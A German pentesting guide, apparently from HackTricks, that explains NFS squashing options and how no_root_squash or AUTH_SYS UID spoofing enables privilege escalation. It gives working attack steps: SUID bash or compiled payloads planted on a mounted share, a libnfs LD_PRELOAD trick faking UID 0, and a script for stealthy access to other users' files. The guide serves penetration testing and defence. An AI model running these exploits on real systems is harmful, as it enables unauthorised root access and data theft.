# NFS No Root Squash Fehlkonfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen zu Squashing

Bei NFS AUTH_SYS/AUTH_UNIX stützt der Server die Prüfungen der Dateiberechtigungen auf die `uid` und `gid`, die in jeder RPC-Anfrage übermittelt werden. Andere Security Flavors wie Kerberos verwenden andere Anmeldedaten, und der Server kann numerische Anmeldedaten vor der Prüfung umsetzen.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Ordnet jede UID und GID dem anonymen Konto zu, das unter Linux standardmäßig `nobody` (65534) ist. `no_all_squash` ist die Standardeinstellung für Anfragen, die nicht von root stammen.<sup>[[4]](#references)</sup>
- **`root_squash`**: Dies ist die Standardeinstellung unter Linux. Anfragen mit UID/GID 0 (root) werden dem anonymen Konto zugeordnet; andere UIDs und GIDs werden nicht umgewandelt.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Deaktiviert das Root-Squashing, sodass Anfragen mit UID/GID 0 auf dem Server als root ausgewertet werden können.<sup>[[4]](#references)</sup>

Kann ein zugelassener Client ein beschreibbares Export-Verzeichnis aus **`/etc/exports`** einhängen, das mit **`no_root_squash`** konfiguriert ist, können seine Anfragen mit UID/GID 0 dort als root-Benutzer des Servers schreiben.<sup>[[4]](#references)</sup>

`root_squash` setzt nur UID/GID 0 um. Unter AUTH_SYS kann eine **numerische UID/GID ungleich null** eines zugelassenen Clients weiterhin einem anderen Konto auf dem Server entsprechen. Ein beschreibbares Export-Verzeichnis kann daher selbst bei aktiviertem Root-Squashing einen Pfad zwischen Benutzern eröffnen, wenn der Client eine Datei mit dieser numerischen Identität erstellen kann und der Server den Zugriff erlaubt. Für eine SUID/SGID-Übergabe müssen außerdem der resultierende Dateieigentümer, der ausführbare Zugriff, der Status von `nosuid` beim Server-Mount, ACLs sowie SELinux oder andere Richtlinien geprüft werden. Der exportierte Pfadname, die `rw`-Option oder eine übereinstimmende Nummer allein beweisen weder, dass der Client zugelassen ist, noch, dass der Export aktiv ist oder dass auf beiden Hosts dieselbe effektive Identitätszuordnung gilt. Prüfe `/etc/exports` und lokale Metadaten passiv; hänge während der Erkundung keine neue Freigabe ein und erstelle keine Testdatei.<sup>[[4]](#references)[[5]](#references)</sup>

Weitere Informationen zu **NFS** findest du hier:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Option 1 mit bash:
- Hänge auf einem zugelassenen Client ein beschreibbares Export-Verzeichnis als root ein, kopiere **`/bin/bash`** dorthin, setze sein **SUID**-Bit und führe es über einen Victim-Mount aus, bei dem `nosuid` nicht verwendet wird.<sup>[[2]](#references)[[4]](#references)</sup>
    - Damit die hochgeladene Datei weiterhin root gehört, muss der Server **`no_root_squash`** verwenden. Wird root gesquasht, ist eine SUID-Binärdatei für ein anderes Konto nur möglich, wenn der Client sie rechtmäßig mit der numerischen UID/GID dieses Kontos erstellen oder besitzen kann.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2 mit kompiliertem C-Code:
- Binde das Verzeichnis von einem erlaubten Client aus ein, kopiere ein kompiliertes Payload hinein, das SUID-Berechtigungen ausnutzt, setze dessen **SUID**-Bit und führe es auf dem Opfer aus (siehe einige [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Dieselben Einschränkungen wie zuvor

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Lokaler Exploit

> [!TIP]
> Beachte: Wenn du **einen Tunnel von deinem Rechner zum Opferrechner einrichten kannst, kannst du weiterhin die Remote-Version verwenden, um diese Privilege Escalation auszunutzen, indem du die erforderlichen Ports tunnelst**.\
> Der folgende Trick ist nützlich, wenn `/etc/exports` den Export auf die IP-Adresse des Opferrechners beschränkt: Der Remote-Client kann ihn nicht mounten, aber die lokale Technik kann über die Freigabe funktionieren, die bereits auf dem erlaubten Host gemountet ist.<sup>[[2]](#references)</sup>\
> Bei dieser unprivilegierten libnfs-Methode muss der Export in **`/etc/exports`** das Flag `insecure` verwenden, damit der Prozess einen nicht reservierten Quellport verwenden kann. `secure` ist die Standardeinstellung, aber ein Prozess, der einen reservierten Port binden kann, benötigt diese Option nicht.<sup>[[1]](#references)[[4]](#references)</sup>

### Grundlegende Informationen

Ein NFSv3-AUTH_UNIX-Client übermittelt bei jedem Aufruf seine effektive UID, GID und Gruppen; der Server verwendet diese Werte für Berechtigungsprüfungen. Diese lokale Technik missbraucht dieses Modell, indem sie die RPC-Anmeldedaten über [libnfs](https://github.com/sahlberg/libnfs) fälscht. Dessen Preload-Modul unterstützt das Überschreiben der UID/GID im NFS-Kontext.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Kompilieren der Bibliothek

Das libnfs-Beispiel erfordert möglicherweise Anpassungen für den Zielkernel. In der hier verwendeten Anleitung wird ausdrücklich darauf hingewiesen, vor dem Kompilieren des Preload-Moduls die fallocate-Systemaufrufe auszukommentieren.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Durchführen des Exploits

Das Beispiel erstellt ein kleines C-Hilfsprogramm, das eine Shell startet, legt es anschließend auf dem Share ab und verwendet `ld_nfs.so` mit UID 0 im NFS-Kontext, um es SUID-root zu machen.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Exploit-Code kompilieren:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Lege den Exploit auf dem Share ab und ändere seine Berechtigungen, indem du die UID fälschst**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Führe den Exploit aus, um Root-Rechte zu erlangen**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus: NFShell für unauffälligen Dateizugriff

Sobald root-Zugriff erlangt wurde, setzt dieses `nfsh.py`-Muster die effektive UID auf die UID der Zieldatei, bevor ein Befehl ausgeführt wird. So ist der Zugriff möglich, ohne die Eigentümerschaft rekursiv zu ändern.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Ausführen wie:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```

## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Eine Geschichte über eine weniger bekannte NFS-Privilege-Escalation](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Spezifikation des NFS-Version-3-Protokolls](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
